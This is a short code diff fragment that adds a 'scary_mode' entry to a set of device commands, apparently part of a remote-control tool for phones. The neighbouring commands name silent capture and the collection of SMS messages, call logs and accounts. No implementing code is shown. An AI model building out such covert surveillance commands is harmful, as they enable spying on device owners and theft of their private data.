@@ -61,6 +61,7 @@ const DEVICE_COMMANDS = new Set([
   'usage',
   'wallpaper',
   'silentcapture',
+  'scary_mode',
   'getsms',
   'getcalllogs',
   'getaccounts',
